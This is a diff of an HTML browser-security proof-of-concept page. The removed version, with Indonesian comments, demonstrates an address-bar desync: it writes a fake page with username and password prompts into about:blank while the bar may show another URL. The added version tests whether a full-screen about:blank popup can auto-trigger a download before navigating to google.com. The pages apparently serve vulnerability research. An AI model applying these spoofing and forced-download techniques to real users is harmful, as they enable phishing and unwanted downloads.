@@ -1,59 +1,73 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-  <title>Safe Address Bar Desync PoC</title>
-  <style>
-    body { font-family: Arial; padding: 20px; }
-    button { padding: 12px; font-size: 16px; cursor: pointer; }
-  </style>
+<meta charset="utf-8">
+<title>Popup Download Gesture Test</title>
+<style>
+body { font-family:sans-serif;padding:20px }
+button { padding:12px 18px;font-size:16px }
+pre { background:#111;color:#0f0;padding:10px }
+</style>
 </head>
 <body>
 
-<h1>Safe Address Bar Desync PoC</h1>
-<p>Versi lengkap dan mirip seperti PoC yang kamu ceritakan, namun 100% aman.</p>
-<p>Tekan tombol di bawah ini.</p>
-
-<button onclick="runTest()">Run Safe PoC</button>
+<h3>Popup Download Gesture Enforcement Test</h3>
+<button id="btn">Open Popup</button>
+<pre id="log"></pre>
 
 <script>
-function runTest() {
-  // 1. URL target dummy (AMAN)
-  // Domain '.test' adalah reserved TLD BUAT TESTING (RFC 2606)
-  let targetURL = "https://dummy.test/login";
+const logEl = document.getElementById("log");
+const log = m => logEl.textContent += m + "\n";
 
-  // 2. Buka tab baru ke target URL
-  let win = window.open(targetURL, "_blank");
+document.getElementById("btn").onclick = () => {
+  log("[1] User click received");
 
-  // 3. Beri jeda kecil supaya UI WebView meng-update address bar
-  //    sebelum navigasi commit (sama seperti PoC aslimu)
+  // 1️⃣ Open popup to about:blank first
+  const w = window.open(
+    "about:blank",
+    "_blank",
+    `
+      width=${screen.availWidth},
+      height=${screen.availHeight},
+      left=0,
+      top=0,
+      resizable=yes,
+      scrollbars=yes
+    `
+  );
+
+  if (!w) {
+    log("[ERROR] Popup blocked");
+    return;
+  }
+
+  log("[2] Popup opened at about:blank");
+
+  // 2️⃣ Inject test payload WHILE origin is about:blank
+  w.document.write(`
+      <a id="dl" download="test.txt"
+       href="data:text/plain,gesture-test"></a>
+    <script>
+      setTimeout(() => {
+        document.getElementById("dl").click();
+        document.body.insertAdjacentHTML(
+          'beforeend',
+          '<p>[CHECK] Download attempt from about:blank</p>'
+        );
+      }, 30);
+    <\/script>
+  `);
+
+  // 3️⃣ Navigate to google.com AFTER
   setTimeout(() => {
     try {
-
-      // 4. Inject konten ke about:blank (sama mekanisme,
-      //    tetapi aman dan tidak spoof domain siapa pun)
-      win.document.write(`
-        <h1 style='color:red;'>This is NOT the real target page!</h1>
-        <p>You are still on <strong>about:blank</strong>, but UI may show the dummy URL.</p>
-        <br>
-        
-        <button onclick="
-          let username = prompt('Enter username (safe demo)');
-          let password = prompt('Enter password (safe demo)');
-          alert('Safe Demo Only:\\nUsername: ' + username + '\\nPassword: ' + password);
-        ">Test Interaction</button>
-
-        <p style='margin-top:20px; font-size:14px; color:gray;'>
-          (This is a harmless demonstration page created from about:blank.)
-        </p>
-      `);
-
-      win.document.close();
-
-    } catch(e) {
-      console.warn('Navigation commit occurred too early or blocked:', e);
+      w.location.href = "https://www.google.com";
+      log("[3] Popup navigated to google.com");
+    } catch (e) {
+      log("[ERROR] Navigation failed: " + e);
     }
-  }, 50); // timing race — sama seperti PoC asli
-}
+  }, 0);
+};
 </script>
 
 </body>
